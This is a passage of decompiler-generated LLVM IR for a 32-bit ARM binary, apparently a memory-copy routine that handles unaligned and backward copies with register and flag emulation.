  br i1 %v2_13ddc, label %dec_label_pc_13de0, label %dec_label_pc_13db0.dec_label_pc_13db0_crit_edge

dec_label_pc_13db0.dec_label_pc_13db0_crit_edge:  ; preds = %dec_label_pc_13db0
  %v0_13db0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_13db4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13db0

dec_label_pc_13de0:                               ; preds = %dec_label_pc_13db0
  %v2_13de0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13de0, i32* @r4, align 4
  %v5_13de0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_13de0, i32* @r5, align 4
  %v1_13de4 = add i32 %v0_13dd8, -4
  store i32 %v1_13de4, i32* %r2.global-to-local, align 4
  %v3_13de4 = add i32 %v0_13dd8, 2147483632
  %v4_13de4 = and i32 %v1_13de4, %v3_13de4
  %v5_13de4 = icmp slt i32 %v4_13de4, 0
  store i1 %v5_13de4, i1* %cpsr_v.global-to-local, align 1
  %v6_13de4 = icmp slt i32 %v1_13de4, 0
  store i1 %v6_13de4, i1* %cpsr_n.global-to-local, align 1
  %v7_13de4 = icmp eq i32 %v1_13de4, 0
  store i1 %v7_13de4, i1* %cpsr_z.global-to-local, align 1
  %v2_13de8 = xor i1 %v6_13de4, %v5_13de4
  br i1 %v2_13de8, label %dec_label_pc_13e04, label %dec_label_pc_13dec

dec_label_pc_13dec:                               ; preds = %dec_label_pc_13de0, %dec_label_pc_13da0, %dec_label_pc_13dec
  %v1_13df8 = phi i32 [ %v4_13df8, %dec_label_pc_13dec ], [ %v12_13dd4, %dec_label_pc_13de0 ], [ %v0_13eac75, %dec_label_pc_13da0 ]
  %v0_13dec = load i32, i32* %lr.global-to-local, align 4
  %v3_13dec = udiv i32 %v0_13dec, 256
  store i32 %v3_13dec, i32* %ip.global-to-local, align 4
  %v0_13df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13df0 = inttoptr i32 %v0_13df0 to i32*
  %v2_13df0 = load i32, i32* %v1_13df0, align 4
  store i32 %v2_13df0, i32* %lr.global-to-local, align 4
  %v4_13df0 = add i32 %v0_13df0, 4
  store i32 %v4_13df0, i32* %r1.global-to-local, align 4
  %v4_13df4 = mul i32 %v2_13df0, 16777216
  %v5_13df4 = or i32 %v4_13df4, %v3_13dec
  store i32 %v5_13df4, i32* @ip, align 4
  %v2_13df8 = inttoptr i32 %v1_13df8 to i32*
  store i32 %v5_13df4, i32* %v2_13df8, align 4
  %v3_13df8 = load i32, i32* %r0.global-to-local, align 4
  %v4_13df8 = add i32 %v3_13df8, 4
  store i32 %v4_13df8, i32* %r0.global-to-local, align 4
  %v0_13dfc = load i32, i32* %r2.global-to-local, align 4
  %v1_13dfc = add i32 %v0_13dfc, -4
  store i32 %v1_13dfc, i32* %r2.global-to-local, align 4
  %v3_13dfc = sub i32 3, %v0_13dfc
  %v4_13dfc = and i32 %v3_13dfc, %v0_13dfc
  %v5_13dfc = icmp slt i32 %v4_13dfc, 0
  %v6_13dfc = icmp slt i32 %v1_13dfc, 0
  %v2_13e00 = xor i1 %v6_13dfc, %v5_13dfc
  br i1 %v2_13e00, label %dec_label_pc_13e04.loopexit, label %dec_label_pc_13dec

dec_label_pc_13e04.loopexit:                      ; preds = %dec_label_pc_13dec
  %v7_13dfc = icmp eq i32 %v0_13dfc, 4
  store i1 %v5_13dfc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_13dfc, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_13dfc, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e04

dec_label_pc_13e04:                               ; preds = %dec_label_pc_13e04.loopexit, %dec_label_pc_13de0
  %v0_13d2c58 = phi i32 [ %v1_13dfc, %dec_label_pc_13e04.loopexit ], [ %v1_13de4, %dec_label_pc_13de0 ]
  %v0_13e04 = load i32, i32* %r1.global-to-local, align 4
  %v1_13e04 = add i32 %v0_13e04, -3
  store i32 %v1_13e04, i32* @r1, align 4
  br label %bb140

dec_label_pc_13e0c:                               ; preds = %dec_label_pc_13d8c
  br i1 %v2_13e10, label %dec_label_pc_13e58, label %dec_label_pc_13e14

dec_label_pc_13e14:                               ; preds = %dec_label_pc_13e0c
  store i32 %v1_13e0c, i32* %r2.global-to-local, align 4
  %v3_13e18 = load i32, i32* @r4, align 4
  store i32 %v3_13e18, i32* %stack_var_-16, align 4
  %v6_13e18 = load i32, i32* @r5, align 4
  store i32 %v6_13e18, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13e1c

dec_label_pc_13e1c:                               ; preds = %dec_label_pc_13e1c.dec_label_pc_13e1c_crit_edge, %dec_label_pc_13e14
  %v0_13e40 = phi i32 [ %v12_13e40, %dec_label_pc_13e1c.dec_label_pc_13e1c_crit_edge ], [ %v0_13eac75, %dec_label_pc_13e14 ]
  %v0_13e20 = phi i32 [ %v0_13e20.pre, %dec_label_pc_13e1c.dec_label_pc_13e1c_crit_edge ], [ %v4_13d90, %dec_label_pc_13e14 ]
  %v0_13e1c = phi i32 [ %v0_13e1c.pre, %dec_label_pc_13e1c.dec_label_pc_13e1c_crit_edge ], [ %v2_13d90, %dec_label_pc_13e14 ]
  %v3_13e1c = udiv i32 %v0_13e1c, 65536
  %v1_13e20 = inttoptr i32 %v0_13e20 to i32*
  %v2_13e20 = load i32, i32* %v1_13e20, align 4
  store i32 %v2_13e20, i32* %r4.global-to-local, align 4
  %v3_13e20 = add i32 %v0_13e20, 4
  %v4_13e20 = inttoptr i32 %v3_13e20 to i32*
  %v5_13e20 = load i32, i32* %v4_13e20, align 4
  store i32 %v5_13e20, i32* %r5.global-to-local, align 4
  %v6_13e20 = add i32 %v0_13e20, 8
  %v7_13e20 = inttoptr i32 %v6_13e20 to i32*
  %v8_13e20 = load i32, i32* %v7_13e20, align 4
  store i32 %v8_13e20, i32* %ip.global-to-local, align 4
  %v9_13e20 = add i32 %v0_13e20, 12
  %v10_13e20 = inttoptr i32 %v9_13e20 to i32*
  %v11_13e20 = load i32, i32* %v10_13e20, align 4
  store i32 %v11_13e20, i32* %lr.global-to-local, align 4
  %v12_13e20 = add i32 %v0_13e20, 16
  store i32 %v12_13e20, i32* %r1.global-to-local, align 4
  %v4_13e24 = mul i32 %v2_13e20, 65536
  %v5_13e24 = or i32 %v4_13e24, %v3_13e1c
  store i32 %v5_13e24, i32* @r3, align 4
  %v3_13e28 = udiv i32 %v2_13e20, 65536
  %v4_13e2c = mul i32 %v5_13e20, 65536
  %v5_13e2c = or i32 %v4_13e2c, %v3_13e28
  store i32 %v5_13e2c, i32* %r4.global-to-local, align 4
  %v3_13e30 = udiv i32 %v5_13e20, 65536
  %v4_13e34 = mul i32 %v8_13e20, 65536
  %v5_13e34 = or i32 %v4_13e34, %v3_13e30
  store i32 %v5_13e34, i32* %r5.global-to-local, align 4
  %v3_13e38 = udiv i32 %v8_13e20, 65536
  %v4_13e3c = mul i32 %v11_13e20, 65536
  %v5_13e3c = or i32 %v4_13e3c, %v3_13e38
  store i32 %v5_13e3c, i32* @ip, align 4
  %v1_13e40 = inttoptr i32 %v0_13e40 to i32*
  store i32 %v5_13e24, i32* %v1_13e40, align 4
  %v3_13e40 = add i32 %v0_13e40, 4
  %v4_13e40 = inttoptr i32 %v3_13e40 to i32*
  %v5_13e40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13e40, i32* %v4_13e40, align 4
  %v6_13e40 = add i32 %v0_13e40, 8
  %v7_13e40 = inttoptr i32 %v6_13e40 to i32*
  %v8_13e40 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_13e40, i32* %v7_13e40, align 4
  %v9_13e40 = add i32 %v0_13e40, 12
  %v10_13e40 = inttoptr i32 %v9_13e40 to i32*
  %v11_13e40 = load i32, i32* @ip, align 4
  store i32 %v11_13e40, i32* %v10_13e40, align 4
  %v12_13e40 = add i32 %v0_13e40, 16
  store i32 %v12_13e40, i32* %r0.global-to-local, align 4
  %v0_13e44 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e44 = add i32 %v0_13e44, -16
  store i32 %v1_13e44, i32* %r2.global-to-local, align 4
  %v3_13e44 = sub i32 15, %v0_13e44
  %v4_13e44 = and i32 %v3_13e44, %v0_13e44
  %v5_13e44 = icmp slt i32 %v4_13e44, 0
  %v6_13e44 = icmp slt i32 %v1_13e44, 0
  %v2_13e48 = xor i1 %v6_13e44, %v5_13e44
  br i1 %v2_13e48, label %dec_label_pc_13e4c, label %dec_label_pc_13e1c.dec_label_pc_13e1c_crit_edge

dec_label_pc_13e1c.dec_label_pc_13e1c_crit_edge:  ; preds = %dec_label_pc_13e1c
  %v0_13e1c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_13e20.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e1c

dec_label_pc_13e4c:                               ; preds = %dec_label_pc_13e1c
  %v2_13e4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13e4c, i32* @r4, align 4
  %v5_13e4c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_13e4c, i32* @r5, align 4
  %v1_13e50 = add i32 %v0_13e44, -4
  store i32 %v1_13e50, i32* %r2.global-to-local, align 4
  %v3_13e50 = add i32 %v0_13e44, 2147483632
  %v4_13e50 = and i32 %v1_13e50, %v3_13e50
  %v5_13e50 = icmp slt i32 %v4_13e50, 0
  store i1 %v5_13e50, i1* %cpsr_v.global-to-local, align 1
  %v6_13e50 = icmp slt i32 %v1_13e50, 0
  store i1 %v6_13e50, i1* %cpsr_n.global-to-local, align 1
  %v7_13e50 = icmp eq i32 %v1_13e50, 0
  store i1 %v7_13e50, i1* %cpsr_z.global-to-local, align 1
  %v2_13e54 = xor i1 %v6_13e50, %v5_13e50
  br i1 %v2_13e54, label %dec_label_pc_13e70, label %dec_label_pc_13e58

dec_label_pc_13e58:                               ; preds = %dec_label_pc_13e4c, %dec_label_pc_13e0c, %dec_label_pc_13e58
  %v1_13e64 = phi i32 [ %v4_13e64, %dec_label_pc_13e58 ], [ %v12_13e40, %dec_label_pc_13e4c ], [ %v0_13eac75, %dec_label_pc_13e0c ]
  %v0_13e58 = load i32, i32* %lr.global-to-local, align 4
  %v3_13e58 = udiv i32 %v0_13e58, 65536
  store i32 %v3_13e58, i32* %ip.global-to-local, align 4
  %v0_13e5c = load i32, i32* %r1.global-to-local, align 4
  %v1_13e5c = inttoptr i32 %v0_13e5c to i32*
  %v2_13e5c = load i32, i32* %v1_13e5c, align 4
  store i32 %v2_13e5c, i32* %lr.global-to-local, align 4
  %v4_13e5c = add i32 %v0_13e5c, 4
  store i32 %v4_13e5c, i32* %r1.global-to-local, align 4
  %v4_13e60 = mul i32 %v2_13e5c, 65536
  %v5_13e60 = or i32 %v4_13e60, %v3_13e58
  store i32 %v5_13e60, i32* @ip, align 4
  %v2_13e64 = inttoptr i32 %v1_13e64 to i32*
  store i32 %v5_13e60, i32* %v2_13e64, align 4
  %v3_13e64 = load i32, i32* %r0.global-to-local, align 4
  %v4_13e64 = add i32 %v3_13e64, 4
  store i32 %v4_13e64, i32* %r0.global-to-local, align 4
  %v0_13e68 = load i32, i32* %r2.global-to-local, align 4
  %v1_13e68 = add i32 %v0_13e68, -4
  store i32 %v1_13e68, i32* %r2.global-to-local, align 4
  %v3_13e68 = sub i32 3, %v0_13e68
  %v4_13e68 = and i32 %v3_13e68, %v0_13e68
  %v5_13e68 = icmp slt i32 %v4_13e68, 0
  %v6_13e68 = icmp slt i32 %v1_13e68, 0
  %v2_13e6c = xor i1 %v6_13e68, %v5_13e68
  br i1 %v2_13e6c, label %dec_label_pc_13e70.loopexit, label %dec_label_pc_13e58

dec_label_pc_13e70.loopexit:                      ; preds = %dec_label_pc_13e58
  %v7_13e68 = icmp eq i32 %v0_13e68, 4
  store i1 %v5_13e68, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_13e68, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_13e68, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13e70

dec_label_pc_13e70:                               ; preds = %dec_label_pc_13e70.loopexit, %dec_label_pc_13e4c
  %v0_13d2c59 = phi i32 [ %v1_13e68, %dec_label_pc_13e70.loopexit ], [ %v1_13e50, %dec_label_pc_13e4c ]
  %v0_13e70 = load i32, i32* %r1.global-to-local, align 4
  %v1_13e70 = add i32 %v0_13e70, -2
  store i32 %v1_13e70, i32* @r1, align 4
  br label %bb140

dec_label_pc_13e78:                               ; preds = %dec_label_pc_13d8c
  br i1 %v2_13e10, label %dec_label_pc_13ec4, label %dec_label_pc_13e80

dec_label_pc_13e80:                               ; preds = %dec_label_pc_13e78
  store i32 %v1_13e0c, i32* %r2.global-to-local, align 4
  %v3_13e84 = load i32, i32* @r4, align 4
  store i32 %v3_13e84, i32* %stack_var_-16, align 4
  %v6_13e84 = load i32, i32* @r5, align 4
  store i32 %v6_13e84, i32* %stack_var_-12, align 4
  br label %dec_label_pc_13e88

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e88.dec_label_pc_13e88_crit_edge, %dec_label_pc_13e80
  %v0_13eac = phi i32 [ %v12_13eac, %dec_label_pc_13e88.dec_label_pc_13e88_crit_edge ], [ %v0_13eac75, %dec_label_pc_13e80 ]
  %v0_13e8c = phi i32 [ %v0_13e8c.pre, %dec_label_pc_13e88.dec_label_pc_13e88_crit_edge ], [ %v4_13d90, %dec_label_pc_13e80 ]
  %v0_13e88 = phi i32 [ %v0_13e88.pre, %dec_label_pc_13e88.dec_label_pc_13e88_crit_edge ], [ %v2_13d90, %dec_label_pc_13e80 ]
  %v3_13e88 = udiv i32 %v0_13e88, 16777216
  %v1_13e8c = inttoptr i32 %v0_13e8c to i32*
  %v2_13e8c = load i32, i32* %v1_13e8c, align 4
  store i32 %v2_13e8c, i32* %r4.global-to-local, align 4
  %v3_13e8c = add i32 %v0_13e8c, 4
  %v4_13e8c = inttoptr i32 %v3_13e8c to i32*
  %v5_13e8c = load i32, i32* %v4_13e8c, align 4
  store i32 %v5_13e8c, i32* %r5.global-to-local, align 4
  %v6_13e8c = add i32 %v0_13e8c, 8
  %v7_13e8c = inttoptr i32 %v6_13e8c to i32*
  %v8_13e8c = load i32, i32* %v7_13e8c, align 4
  store i32 %v8_13e8c, i32* %ip.global-to-local, align 4
  %v9_13e8c = add i32 %v0_13e8c, 12
  %v10_13e8c = inttoptr i32 %v9_13e8c to i32*
  %v11_13e8c = load i32, i32* %v10_13e8c, align 4
  store i32 %v11_13e8c, i32* %lr.global-to-local, align 4
  %v12_13e8c = add i32 %v0_13e8c, 16
  store i32 %v12_13e8c, i32* %r1.global-to-local, align 4
  %v4_13e90 = mul i32 %v2_13e8c, 256
  %v5_13e90 = or i32 %v4_13e90, %v3_13e88
  store i32 %v5_13e90, i32* @r3, align 4
  %v3_13e94 = udiv i32 %v2_13e8c, 16777216
  %v4_13e98 = mul i32 %v5_13e8c, 256
  %v5_13e98 = or i32 %v4_13e98, %v3_13e94
  store i32 %v5_13e98, i32* %r4.global-to-local, align 4
  %v3_13e9c = udiv i32 %v5_13e8c, 16777216
  %v4_13ea0 = mul i32 %v8_13e8c, 256
  %v5_13ea0 = or i32 %v4_13ea0, %v3_13e9c
  store i32 %v5_13ea0, i32* %r5.global-to-local, align 4
  %v3_13ea4 = udiv i32 %v8_13e8c, 16777216
  %v4_13ea8 = mul i32 %v11_13e8c, 256
  %v5_13ea8 = or i32 %v4_13ea8, %v3_13ea4
  store i32 %v5_13ea8, i32* @ip, align 4
  %v1_13eac = inttoptr i32 %v0_13eac to i32*
  store i32 %v5_13e90, i32* %v1_13eac, align 4
  %v3_13eac = add i32 %v0_13eac, 4
  %v4_13eac = inttoptr i32 %v3_13eac to i32*
  %v5_13eac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_13eac, i32* %v4_13eac, align 4
  %v6_13eac = add i32 %v0_13eac, 8
  %v7_13eac = inttoptr i32 %v6_13eac to i32*
  %v8_13eac = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_13eac, i32* %v7_13eac, align 4
  %v9_13eac = add i32 %v0_13eac, 12
  %v10_13eac = inttoptr i32 %v9_13eac to i32*
  %v11_13eac = load i32, i32* @ip, align 4
  store i32 %v11_13eac, i32* %v10_13eac, align 4
  %v12_13eac = add i32 %v0_13eac, 16
  store i32 %v12_13eac, i32* %r0.global-to-local, align 4
  %v0_13eb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13eb0 = add i32 %v0_13eb0, -16
  store i32 %v1_13eb0, i32* %r2.global-to-local, align 4
  %v3_13eb0 = sub i32 15, %v0_13eb0
  %v4_13eb0 = and i32 %v3_13eb0, %v0_13eb0
  %v5_13eb0 = icmp slt i32 %v4_13eb0, 0
  %v6_13eb0 = icmp slt i32 %v1_13eb0, 0
  %v2_13eb4 = xor i1 %v6_13eb0, %v5_13eb0
  br i1 %v2_13eb4, label %dec_label_pc_13eb8, label %dec_label_pc_13e88.dec_label_pc_13e88_crit_edge

dec_label_pc_13e88.dec_label_pc_13e88_crit_edge:  ; preds = %dec_label_pc_13e88
  %v0_13e88.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_13e8c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13e88

dec_label_pc_13eb8:                               ; preds = %dec_label_pc_13e88
  %v2_13eb8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13eb8, i32* @r4, align 4
  %v5_13eb8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_13eb8, i32* @r5, align 4
  %v1_13ebc = add i32 %v0_13eb0, -4
  store i32 %v1_13ebc, i32* %r2.global-to-local, align 4
  %v3_13ebc = add i32 %v0_13eb0, 2147483632
  %v4_13ebc = and i32 %v1_13ebc, %v3_13ebc
  %v5_13ebc = icmp slt i32 %v4_13ebc, 0
  store i1 %v5_13ebc, i1* %cpsr_v.global-to-local, align 1
  %v6_13ebc = icmp slt i32 %v1_13ebc, 0
  store i1 %v6_13ebc, i1* %cpsr_n.global-to-local, align 1
  %v7_13ebc = icmp eq i32 %v1_13ebc, 0
  store i1 %v7_13ebc, i1* %cpsr_z.global-to-local, align 1
  %v2_13ec0 = xor i1 %v6_13ebc, %v5_13ebc
  br i1 %v2_13ec0, label %dec_label_pc_13edc, label %dec_label_pc_13ec4

dec_label_pc_13ec4:                               ; preds = %dec_label_pc_13eb8, %dec_label_pc_13e78, %dec_label_pc_13ec4
  %v1_13ed0 = phi i32 [ %v4_13ed0, %dec_label_pc_13ec4 ], [ %v12_13eac, %dec_label_pc_13eb8 ], [ %v0_13eac75, %dec_label_pc_13e78 ]
  %v0_13ec4 = load i32, i32* %lr.global-to-local, align 4
  %v3_13ec4 = udiv i32 %v0_13ec4, 16777216
  store i32 %v3_13ec4, i32* %ip.global-to-local, align 4
  %v0_13ec8 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ec8 = inttoptr i32 %v0_13ec8 to i32*
  %v2_13ec8 = load i32, i32* %v1_13ec8, align 4
  store i32 %v2_13ec8, i32* %lr.global-to-local, align 4
  %v4_13ec8 = add i32 %v0_13ec8, 4
  store i32 %v4_13ec8, i32* %r1.global-to-local, align 4
  %v4_13ecc = mul i32 %v2_13ec8, 256
  %v5_13ecc = or i32 %v4_13ecc, %v3_13ec4
  store i32 %v5_13ecc, i32* @ip, align 4
  %v2_13ed0 = inttoptr i32 %v1_13ed0 to i32*
  store i32 %v5_13ecc, i32* %v2_13ed0, align 4
  %v3_13ed0 = load i32, i32* %r0.global-to-local, align 4
  %v4_13ed0 = add i32 %v3_13ed0, 4
  store i32 %v4_13ed0, i32* %r0.global-to-local, align 4
  %v0_13ed4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13ed4 = add i32 %v0_13ed4, -4
  store i32 %v1_13ed4, i32* %r2.global-to-local, align 4
  %v3_13ed4 = sub i32 3, %v0_13ed4
  %v4_13ed4 = and i32 %v3_13ed4, %v0_13ed4
  %v5_13ed4 = icmp slt i32 %v4_13ed4, 0
  %v6_13ed4 = icmp slt i32 %v1_13ed4, 0
  %v2_13ed8 = xor i1 %v6_13ed4, %v5_13ed4
  br i1 %v2_13ed8, label %dec_label_pc_13edc.loopexit, label %dec_label_pc_13ec4

dec_label_pc_13edc.loopexit:                      ; preds = %dec_label_pc_13ec4
  %v7_13ed4 = icmp eq i32 %v0_13ed4, 4
  store i1 %v5_13ed4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_13ed4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_13ed4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_13edc

dec_label_pc_13edc:                               ; preds = %dec_label_pc_13edc.loopexit, %dec_label_pc_13eb8
  %v0_13d2c60 = phi i32 [ %v1_13ed4, %dec_label_pc_13edc.loopexit ], [ %v1_13ebc, %dec_label_pc_13eb8 ]
  %v0_13edc = load i32, i32* %r1.global-to-local, align 4
  %v1_13edc = add i32 %v0_13edc, -1
  store i32 %v1_13edc, i32* @r1, align 4
  br label %bb140

dec_label_pc_13ee4:                               ; preds = %entry
  %v1_13ee4 = load i32, i32* @r2, align 4
  %v2_13ee4 = add i32 %v1_13ee4, %v0_13c90
  store i32 %v2_13ee4, i32* @r1, align 4
  %v2_13ee8 = add i32 %v1_13ee4, %v1_13c90
  store i32 %v2_13ee8, i32* %r0.global-to-local, align 4
  %v2_13eec = add i32 %v1_13ee4, -4
  store i32 %v2_13eec, i32* %r2.global-to-local, align 4
  %v4_13eec = sub i32 3, %v1_13ee4
  %v5_13eec = and i32 %v4_13eec, %v1_13ee4
  %v6_13eec = icmp slt i32 %v5_13eec, 0
  store i1 %v6_13eec, i1* %cpsr_v.global-to-local, align 1
  %v7_13eec = icmp slt i32 %v2_13eec, 0
  store i1 %v7_13eec, i1* %cpsr_n.global-to-local, align 1
  %v8_13eec = icmp eq i32 %v1_13ee4, 4
  store i1 %v8_13eec, i1* %cpsr_z.global-to-local, align 1
  %v5_13ef0 = icmp slt i32 %v1_13ee4, 4
  br i1 %v5_13ef0, label %bb150, label %dec_label_pc_13ef4

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13ee4
  %v1_13ef4 = urem i32 %v2_13ee8, 4
  store i32 %v1_13ef4, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13ef4 = icmp eq i32 %v1_13ef4, 0
  store i1 %v2_13ef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13ef4, label %dec_label_pc_13efc, label %dec_label_pc_13f9c

dec_label_pc_13efc:                               ; preds = %dec_label_pc_13ef4
  %v1_13efc = urem i32 %v2_13ee4, 4
  store i32 %v1_13efc, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_13efc = icmp eq i32 %v1_13efc, 0
  store i1 %v2_13efc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13efc, label %dec_label_pc_13f04, label %dec_label_pc_13fc8

dec_label_pc_13f04:                               ; preds = %dec_label_pc_13efc, %dec_label_pc_13fc0
  %v0_13f1c36 = phi i32 [ %v2_13ee8, %dec_label_pc_13efc ], [ %v0_1401019, %dec_label_pc_13fc0 ]
  %v0_13f1835 = phi i32 [ %v2_13ee4, %dec_label_pc_13efc ], [ %v0_13fc0, %dec_label_pc_13fc0 ]
  %v0_13f04 = phi i32 [ %v2_13eec, %dec_label_pc_13efc ], [ %v2_13fb8, %dec_label_pc_13fc0 ]
  %v2_13f04 = add i32 %v0_13f04, -8
  store i32 %v2_13f04, i32* %r2.global-to-local, align 4
  %v4_13f04 = sub i32 7, %v0_13f04
  %v5_13f04 = and i32 %v4_13f04, %v0_13f04
  %v6_13f04 = icmp slt i32 %v5_13f04, 0
  store i1 %v6_13f04, i1* %cpsr_v.global-to-local, align 1
  %v7_13f04 = icmp slt i32 %v2_13f04, 0
  store i1 %v7_13f04, i1* %cpsr_n.global-to-local, align 1
  %v8_13f04 = icmp eq i32 %v0_13f04, 8
  store i1 %v8_13f04, i1* %cpsr_z.global-to-local, align 1
  %v5_13f08 = icmp slt i32 %v0_13f04, 8
  br i1 %v5_13f08, label %dec_label_pc_13f54, label %dec_label_pc_13f0c

dec_label_pc_13f0c:                               ; preds = %dec_label_pc_13f04
  %v3_13f0c = load i32, i32* @r4, align 4
  %v5_13f0c = inttoptr i32 %v3_13f0c to i8*
  store i8* %v5_13f0c, i8** %stack_var_-8, align 4
  %v8_13f0c = load i32, i32* @lr, align 4
  %v2_13f10 = add i32 %v0_13f04, -28
  store i32 %v2_13f10, i32* %r2.global-to-local, align 4
  %v4_13f10 = sub i32 27, %v0_13f04
  %v5_13f10 = and i32 %v4_13f10, %v2_13f04
  %v6_13f10 = icmp slt i32 %v5_13f10, 0
  store i1 %v6_13f10, i1* %cpsr_v.global-to-local, align 1
  %v7_13f10 = icmp slt i32 %v2_13f10, 0
  store i1 %v7_13f10, i1* %cpsr_n.global-to-local, align 1
  %v8_13f10 = icmp eq i32 %v2_13f04, 20
  store i1 %v8_13f10, i1* %cpsr_z.global-to-local, align 1
  %v5_13f14 = icmp slt i32 %v2_13f04, 20
  br i1 %v5_13f14, label %dec_label_pc_13f30, label %dec_label_pc_13f18

dec_label_pc_13f18:                               ; preds = %dec_label_pc_13f0c, %dec_label_pc_13f18.dec_label_pc_13f18_crit_edge
  %v0_13f1c = phi i32 [ %v1_13f24, %dec_label_pc_13f18.dec_label_pc_13f18_crit_edge ], [ %v0_13f1c36, %dec_label_pc_13f0c ]
  %v0_13f18 = phi i32 [ %v0_13f18.pre, %dec_label_pc_13f18.dec_label_pc_13f18_crit_edge ], [ %v0_13f1835, %dec_label_pc_13f0c ]
  %v1_13f18 = add i32 %v0_13f18, -4
  %v2_13f18 = inttoptr i32 %v1_13f18 to i32*
  %v3_13f18 = load i32, i32* %v2_13f18, align 4
  %v4_13f18 = add i32 %v0_13f18, -8
  %v5_13f18 = inttoptr i32 %v4_13f18 to i32*
  %v6_13f18 = load i32, i32* %v5_13f18, align 4
  store i32 %v6_13f18, i32* %r4.global-to-local, align 4
  %v7_13f18 = add i32 %v0_13f18, -12
  %v8_13f18 = inttoptr i32 %v7_13f18 to i32*
  %v9_13f18 = load i32, i32* %v8_13f18, align 4
  store i32 %v9_13f18, i32* %ip.global-to-local, align 4
  %v10_13f18 = add i32 %v0_13f18, -16
  %v11_13f18 = inttoptr i32 %v10_13f18 to i32*
  %v12_13f18 = load i32, i32* %v11_13f18, align 4
  store i32 %v12_13f18, i32* %lr.global-to-local, align 4
  store i32 %v10_13f18, i32* %r1.global-to-local, align 4
  %v1_13f1c = add i32 %v0_13f1c, -16
  %v2_13f1c = inttoptr i32 %v1_13f1c to i32*
  store i32 %v3_13f18, i32* %v2_13f1c, align 4
  %v4_13f1c = add i32 %v0_13f1c, -12
  %v5_13f1c = inttoptr i32 %v4_13f1c to i32*
  %v6_13f1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_13f1c, i32* %v5_13f1c, align 4
  %v7_13f1c = add i32 %v0_13f1c, -8
  %v8_13f1c = inttoptr i32 %v7_13f1c to i32*
  %v9_13f1c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_13f1c, i32* %v8_13f1c, align 4
  %v10_13f1c = add i32 %v0_13f1c, -4
  %v11_13f1c = inttoptr i32 %v10_13f1c to i32*
  %v12_13f1c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_13f1c, i32* %v11_13f1c, align 4
  store i32 %v1_13f1c, i32* %r0.global-to-local, align 4
  %v0_13f20 = load i32, i32* %r1.global-to-local, align 4
  %v1_13f20 = add i32 %v0_13f20, -4
  %v2_13f20 = inttoptr i32 %v1_13f20 to i32*
  %v3_13f20 = load i32, i32* %v2_13f20, align 4
  store i32 %v3_13f20, i32* @r3, align 4
  %v4_13f20 = add i32 %v0_13f20, -8
  %v5_13f20 = inttoptr i32 %v4_13f20 to i32*
  %v6_13f20 = load i32, i32* %v5_13f20, align 4
  store i32 %v6_13f20, i32* %r4.global-to-local, align 4
  %v7_13f20 = add i32 %v0_13f20, -12
  %v8_13f20 = inttoptr i32 %v7_13f20 to i32*
  %v9_13f20 = load i32, i32* %v8_13f20, align 4
  store i32 %v9_13f20, i32* @ip, align 4
  %v10_13f20 = add i32 %v0_13f20, -16
  %v11_13f20 = inttoptr i32 %v10_13f20 to i32*
  %v12_13f20 = load i32, i32* %v11_13f20, align 4
  store i32 %v12_13f20, i32* %lr.global-to-local, align 4
  store i32 %v10_13f20, i32* @r1, align 4
  %v1_13f24 = add i32 %v0_13f1c, -32
  %v2_13f24 = inttoptr i32 %v1_13f24 to i32*
  store i32 %v3_13f20, i32* %v2_13f24, align 4
  %v4_13f24 = add i32 %v0_13f1c, -28
  %v5_13f24 = inttoptr i32 %v4_13f24 to i32*
  %v6_13f24 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_13f24, i32* %v5_13f24, align 4
  %v7_13f24 = add i32 %v0_13f1c, -24
  %v8_13f24 = inttoptr i32 %v7_13f24 to i32*
  %v9_13f24 = load i32, i32* @ip, align 4
  store i32 %v9_13f24, i32* %v8_13f24, align 4
  %v10_13f24 = add i32 %v0_13f1c, -20
  %v11_13f24 = inttoptr i32 %v10_13f24 to i32*
  %v12_13f24 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_13f24, i32* %v11_13f24, align 4
  store i32 %v1_13f24, i32* %r0.global-to-local, align 4
  %v0_13f28 = load i32, i32* %r2.global-to-local, align 4
  %v2_13f28 = add i32 %v0_13f28, -32
  store i32 %v2_13f28, i32* %r2.global-to-local, align 4
  %v6_13f2c = icmp slt i32 %v0_13f28, 32
